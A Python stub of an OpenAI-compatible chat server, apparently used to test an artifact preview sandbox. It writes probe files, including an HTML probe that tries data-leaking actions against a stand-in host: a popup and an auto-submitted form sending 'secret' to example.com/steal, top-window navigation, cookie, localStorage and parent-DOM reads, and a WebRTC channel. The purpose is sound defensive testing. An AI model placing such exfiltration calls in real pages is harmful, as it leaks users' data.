#!/usr/bin/env python3
"""OpenAI 兼容桩:一轮里用 artifact 工具写四份探针文件,然后收尾说一句。

四份文件各自探一类能力(见 run.py 的判定表):
  probe.html  内联 CSS / 内联脚本 / 外部 CDN 脚本 / 外链图 / data: 图 / 按钮
  probe.svg   矢量图能不能预览
  probe.csv   表格类文本有没有表格视图
  probe.md    mermaid 围栏、KaTeX、代码块高亮
"""
import json
import os
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = int(os.environ.get("STUB_PORT", "18499"))
DELAY = float(os.environ.get("STUB_CHUNK_SLEEP", "0.05"))

HTML = """<!doctype html>
<meta charset="utf-8">
<title>Artifact probe</title>
<style>
  body { font-family: system-ui, sans-serif; padding: 14px; background: #fff; color: #111; }
  .box { border: 2px solid #999; border-radius: 6px; padding: 8px 10px; margin: 6px 0; }
  h1 { font-size: 18px; margin: 0 0 10px; }
</style>
<h1>Artifact probe</h1>
<div class="box" id="css">A inline-css: 看得到边框就是生效</div>
<div class="box" id="js">B inline-script: NOT RUN</div>
<div class="box" id="cdn">C cdn-script: NOT LOADED</div>
<div class="box">D remote-img: <img id="rimg" src="https://www.gstatic.com/webp/gallery/1.jpg" alt="remote" width="60" height="40"></div>
<div class="box">E data-img: <img id="dimg" alt="data" width="60" height="40" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='60' height='40'><rect width='60' height='40' fill='%234a90d9'/></svg>"></div>
<div class="box" id="btn">F button: <button id="b" onclick="this.textContent='CLICKED'">click me</button></div>
<div class="box" id="fetchbox">G fetch: NOT TRIED</div>
<div class="box" id="popbox">H window.open: NOT TRIED</div>
<div class="box" id="formbox">I form-post: NOT TRIED
  <form id="f" action="https://example.com/steal" method="get" target="_self"><input name="q" value="secret"></form>
</div>
<div class="box" id="navbox">J top-nav: NOT TRIED</div>
<div class="box" id="cookiebox">K cookie: NOT TRIED</div>
<div class="box" id="storebox">L localStorage: NOT TRIED</div>
<div class="box" id="parentbox">M parent-dom: NOT TRIED</div>
<div class="box" id="vendorbox">N local-vendor: NOT TRIED</div>
<div class="box" id="vendorcssbox">O local-vendor-css: NOT TRIED</div>
<div class="box" id="rtcbox">P webrtc: NOT TRIED</div>
<div class="box" id="echartsbox">Q echarts: NOT TRIED</div>
<div id="chart" style="width:420px;height:240px"></div>
<script src="/vendor/echarts/echarts.min.js"></script>
<link rel="stylesheet" href="/vendor/katex/katex.min.css">
<script src="/vendor/prism/prism.min.js"></script>
<script>
  document.getElementById('js').textContent = 'B inline-script: RAN';
</script>
<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
<script>
  if (window.confetti) document.getElementById('cdn').textContent = 'C cdn-script: LOADED';
  fetch('/api/config').then(function (r) {
    document.getElementById('fetchbox').textContent = 'G fetch: OK ' + r.status;
  }).catch(function (e) {
    document.getElementById('fetchbox').textContent = 'G fetch: BLOCKED';
  });
  try {
    var w = window.open('https://example.com/steal?d=secret', '_blank');
    document.getElementById('popbox').textContent = w ? 'H window.open: OPENED' : 'H window.open: BLOCKED';
  } catch (e) {
    document.getElementById('popbox').textContent = 'H window.open: THREW';
  }
  try {
    document.getElementById('f').submit();
    document.getElementById('formbox').textContent = 'I form-post: SUBMITTED';
  } catch (e) {
    document.getElementById('formbox').textContent = 'I form-post: THREW';
  }
  try {
    top.location.href = 'https://example.com/steal';
    document.getElementById('navbox').textContent = 'J top-nav: NAVIGATED';
  } catch (e) {
    document.getElementById('navbox').textContent = 'J top-nav: BLOCKED';
  }
  // 不透明源下这三样应该全部拿不到:cookie 抛异常、localStorage 抛异常、
  // 父页面 DOM 跨源。这决定了要不要像别家那样再开一个独立 host。
  try {
    var c = document.cookie;
    document.getElementById('cookiebox').textContent = 'K cookie: READABLE len=' + c.length + ' [' + c.slice(0, 40) + ']';
  } catch (e) {
    document.getElementById('cookiebox').textContent = 'K cookie: THREW ' + e.name;
  }
  try {
    window.localStorage.setItem('probe', '1');
    document.getElementById('storebox').textContent = 'L localStorage: WRITABLE n=' + window.localStorage.length;
  } catch (e) {
    document.getElementById('storebox').textContent = 'L localStorage: THREW ' + e.name;
  }
  // WebRTC 是绕开 connect-src 的老通道(Claude 的 artifact CSP 里专门写了 webrtc 'block')。
  try {
    var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    pc.createDataChannel('x');
    document.getElementById('rtcbox').textContent = 'P webrtc: ALLOWED';
    pc.close();
  } catch (e) {
    document.getElementById('rtcbox').textContent = 'P webrtc: BLOCKED ' + e.name;
  }
  // 真正的验收项:她能不能靠本机货架画出一张图。
  var eout = document.getElementById('echartsbox');
  if (!window.echarts) {
    eout.textContent = 'Q echarts: MISSING';
  } else {
    try {
      var chart = echarts.init(document.getElementById('chart'));
      chart.setOption({
        xAxis: { type: 'category', data: ['\u4e00', '\u4e8c', '\u4e09'] },
        yAxis: { type: 'value' },
        series: [{ type: 'bar', data: [3, 7, 2] }]
      });
      var canvas = document.querySelector('#chart canvas');
      eout.textContent = 'Q echarts: RENDERED ' + (canvas ? canvas.width + 'x' + canvas.height : 'NO-CANVAS');
    } catch (e) {
      eout.textContent = 'Q echarts: THREW ' + e.name;
    }
  }
  // 货架前提:不透明源里用相对路径加载本机 vendor 库,CSP 写死 origin 后该放行。
  document.getElementById('vendorbox').textContent =
    window.Prism ? 'N local-vendor: LOADED (Prism ' + (Prism.util ? 'ok' : '?') + ')' : 'N local-vendor: MISSING';
  var sheets = 0;
  try { sheets = document.styleSheets.length; } catch (e) { sheets = -1; }
  document.getElementById('vendorcssbox').textContent = 'O local-vendor-css: sheets=' + sheets;
  try {
    var t = parent.document.title;
    document.getElementById('parentbox').textContent = 'M parent-dom: READABLE [' + t + ']';
  } catch (e) {
    document.getElementById('parentbox').textContent = 'M parent-dom: THREW ' + e.name;
  }
</script>
"""

CHART = """<!doctype html>
<meta charset="utf-8">
<title>本月开销</title>
<style>
  :root { color-scheme: light dark; }
  body { margin: 0; padding: 18px; font-family: system-ui, sans-serif; background: #fbfaf7; color: #23201a; }
  @media (prefers-color-scheme: dark) { body { background: #1b1917; color: #e8e3d9; } }
  h1 { font-size: 19px; margin: 0 0 4px; }
  p.sub { margin: 0 0 16px; opacity: .65; font-size: 13px; }
  .row { display: flex; gap: 16px; flex-wrap: wrap; }
  .card { flex: 1 1 320px; border: 1px solid rgba(128,128,128,.28); border-radius: 10px; padding: 12px; }
  .card h2 { font-size: 13px; margin: 0 0 8px; font-weight: 600; opacity: .75; }
  .chart { width: 100%; height: 240px; }
</style>
<h1>本月开销</h1>
<p class="sub">2026 年 9 月 1 日 – 9 月 11 日 · 合计 ¥2,847</p>
<div class="row">
  <div class="card"><h2>每日支出</h2><div id="daily" class="chart"></div></div>
  <div class="card"><h2>分类占比</h2><div id="split" class="chart"></div></div>
</div>
<script src="/vendor/echarts/echarts.min.js"></script>
<script>
  var dark = matchMedia('(prefers-color-scheme: dark)').matches;
  var ink = dark ? '#e8e3d9' : '#23201a';
  var grid = dark ? 'rgba(232,227,217,.14)' : 'rgba(35,32,26,.12)';
  var daily = echarts.init(document.getElementById('daily'), null, { renderer: 'canvas' });
  daily.setOption({
    grid: { left: 44, right: 12, top: 16, bottom: 28 },
    tooltip: { trigger: 'axis' },
    xAxis: { type: 'category', data: ['1','2','3','4','5','6','7','8','9','10','11'],
             axisLine: { lineStyle: { color: grid } }, axisLabel: { color: ink } },
    yAxis: { type: 'value', splitLine: { lineStyle: { color: grid } }, axisLabel: { color: ink } },
    series: [{ type: 'bar', data: [120,340,86,255,410,190,88,326,145,602,285],
               itemStyle: { color: '#c8a26a', borderRadius: [3,3,0,0] } }]
  });
  var split = echarts.init(document.getElementById('split'), null, { renderer: 'canvas' });
  split.setOption({
    tooltip: { trigger: 'item' },
    legend: { bottom: 0, textStyle: { color: ink } },
    series: [{ type: 'pie', radius: ['42%','66%'], center: ['50%','44%'],
      label: { color: ink },
      data: [
        { value: 1180, name: '\u9910\u996e' }, { value: 620, name: '\u4ea4\u901a' },
        { value: 480, name: '\u8d2d\u7269' }, { value: 340, name: '\u5a31\u4e50' },
        { value: 227, name: '\u5176\u4ed6' }
      ] }]
  });
</script>
"""

SVG = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 120" width="200" height="120">
  <rect width="200" height="120" fill="#f3f0e7"/>
  <circle cx="60" cy="60" r="34" fill="#4a90d9"/>
  <text x="110" y="66" font-family="sans-serif" font-size="14" fill="#333">svg probe</text>
</svg>
"""

CSV = """name,qty,price
apple,3,12.50
pear,7,4.25
melon,1,30.00
"""

MD = """# Markdown probe

Inline math $E = mc^2$ and a block:

$$
\\sum_{i=1}^{n} i = \\frac{n(n+1)}{2}
$$

```mermaid
graph LR
  A[user] --> B[daemon]
  B --> C[model]
  C --> B
```

```rust
fn main() {
    println!("highlight probe");
}
```

| col | val |
|---|---|
| a | 1 |
| b | 2 |
"""


def patch_text():
    parts = ["*** Begin Patch"]
    for name, body in (("probe.html", HTML), ("chart.html", CHART), ("probe.svg", SVG), ("probe.csv", CSV), ("probe.md", MD)):
        parts.append(f"*** Add File: {name}")
        for line in body.splitlines():
            parts.append("+" + line)
    parts.append("*** End Patch")
    return "\n".join(parts) + "\n"


def _tc(index, call_id, name, args):
    return {"tool_calls": [{"index": index, "id": call_id, "type": "function",
                            "function": {"name": name, "arguments": json.dumps(args, ensure_ascii=False)}}]}


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *args):
        pass

    def _sse(self, delta, sleep=True):
        payload = {"id": "stub", "object": "chat.completion.chunk", "model": "stub-artifact",
                   "choices": [{"index": 0, "delta": delta, "finish_reason": None}]}
        self.wfile.write(f"data: {json.dumps(payload, ensure_ascii=False)}\n\n".encode())
        self.wfile.flush()
        if sleep:
            time.sleep(DELAY)

    def _finish(self, reason="stop"):
        payload = {"id": "stub", "object": "chat.completion.chunk", "model": "stub-artifact",
                   "choices": [{"index": 0, "delta": {}, "finish_reason": reason}],
                   "usage": {"prompt_tokens": 40, "completion_tokens": 30, "total_tokens": 70}}
        self.wfile.write(f"data: {json.dumps(payload, ensure_ascii=False)}\n\n".encode())
        self.wfile.write(b"data: [DONE]\n\n")
        self.wfile.flush()

    def _text(self, text):
        for i in range(0, len(text), 8):
            self._sse({"content": text[i:i + 8]})

    def do_POST(self):
        length = int(self.headers.get("content-length", "0"))
        body = json.loads(self.rfile.read(length) or b"{}") if length else {}
        messages = body.get("messages", [])
        acts = sum(1 for m in messages if m.get("role") == "assistant" and m.get("tool_calls"))
        self.send_response(200)
        self.send_header("content-type", "text/event-stream")
        self.send_header("cache-control", "no-cache")
        self.end_headers()
        if acts == 0:
            self._sse(_tc(0, "call_probe", "artifact", {"patchText": patch_text()}))
            self._finish("tool_calls")
        else:
            self._text("四份探针都写好了，右边面板挨个看看。")
            self._finish()

    def do_GET(self):
        self.send_response(200)
        self.send_header("content-type", "application/json")
        payload = json.dumps({"data": [{"id": "stub-artifact"}]}).encode()
        self.send_header("content-length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)


if __name__ == "__main__":
    ThreadingHTTPServer(("127.0.0.1", PORT), Handler).serve_forever()
